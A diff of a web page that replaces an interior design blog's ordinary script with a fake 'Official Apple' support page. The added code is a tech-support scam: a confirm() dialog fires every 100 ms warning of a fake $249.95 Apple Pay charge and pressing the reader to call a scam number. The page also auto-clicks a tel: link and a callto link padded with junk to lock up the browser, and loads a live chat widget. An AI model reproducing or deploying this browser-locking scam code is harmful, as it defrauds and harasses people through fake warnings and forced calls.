-<!-- ========== SCHEMA MARKUP ========== -->
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "Blog",
-  "name": "Abstract Built Matter",
-  "description": "Independent editorial on interior design, architecture, and the built environment.",
-  "url": "https://abstractbuiltmatter.com",
-  "publisher": {
-    "@type": "Organization",
-    "name": "Abstract Built Matter"
-  }
-}
-</script>
-
-<!-- ========== JAVASCRIPT ========== -->
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-bVkCIYskB4Y-EHZYbSwOU.js"></script>
 <script>
-  (function() {
-    // ----- SEARCH TOGGLE -----
-    const searchToggle = document.getElementById('searchToggle');
-    const searchPanel = document.getElementById('searchPanel');
-    const searchInput = document.getElementById('searchInput');
-    const searchButton = document.getElementById('searchButton');
-
-    searchToggle.addEventListener('click', function() {
-      searchPanel.classList.toggle('active');
-      if (searchPanel.classList.contains('active')) {
-        searchInput.focus();
-      }
-    });
-
-    // Search function (basic filter by title/excerpt)
-    function performSearch() {
-      const query = searchInput.value.trim().toLowerCase();
-      const cards = document.querySelectorAll('.article-card, .featured-article');
-      cards.forEach(card => {
-        const text = card.textContent.toLowerCase();
-        if (query === '' || text.includes(query)) {
-          card.style.display = '';
-        } else {
-          card.style.display = 'none';
-        }
-      });
-      // scroll to main content if searching
-      if (query !== '') {
-        document.querySelector('.main-content').scrollIntoView({ behavior: 'smooth', block: 'start' });
-      }
-    }
-
-    searchButton.addEventListener('click', performSearch);
-    searchInput.addEventListener('keyup', function(e) {
-      if (e.key === 'Enter') performSearch();
-    });
-
-    // ----- CATEGORY FILTER -----
-    const categoryButtons = document.querySelectorAll('#categoryList button');
-    const articles = document.querySelectorAll('.article-card, .featured-article');
-
-    categoryButtons.forEach(btn => {
-      btn.addEventListener('click', function() {
-        // active state
-        categoryButtons.forEach(b => b.classList.remove('active'));
-        this.classList.add('active');
-        const cat = this.getAttribute('data-category');
-        articles.forEach(article => {
-          const articleCat = article.getAttribute('data-category');
-          if (cat === 'all' || articleCat === cat) {
-            article.style.display = '';
-          } else {
-            article.style.display = 'none';
-          }
-        });
-        // if search panel open, close it and clear
-        if (searchPanel.classList.contains('active')) {
-          searchPanel.classList.remove('active');
-          searchInput.value = '';
-        }
-      });
-    });
-
-    // ----- FAQ ACCORDION -----
-    document.querySelectorAll('.faq-question').forEach(question => {
-      question.addEventListener('click', function() {
-        const item = this.parentElement;
-        item.classList.toggle('open');
-      });
-    });
-
-    // ----- NEWSLETTER FORM (prevent default) -----
-    const newsletterForm = document.getElementById('newsletterForm');
-    if (newsletterForm) {
-      newsletterForm.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const input = this.querySelector('input');
-        alert('Thank you for subscribing. (Demo — no data sent.)');
-        input.value = '';
-      });
-    }
-
-    // ----- ACTIVE CATEGORY SYNC with search -----
-    // optional: reset category filter when searching
-    searchInput.addEventListener('input', function() {
-      if (this.value.trim() === '') {
-        // reset to all
-        categoryButtons.forEach(b => b.classList.remove('active'));
-        document.querySelector('#categoryList button[data-category="all"]').classList.add('active');
-        articles.forEach(a => a.style.display = '');
-      }
-    });
-  })();
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
 </script>
-</body>
-</html>
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-844-959-1880 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-844-959-1880
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
+
+
+
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-844-959-1880');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-844-959-1880"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-844-959-1880 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
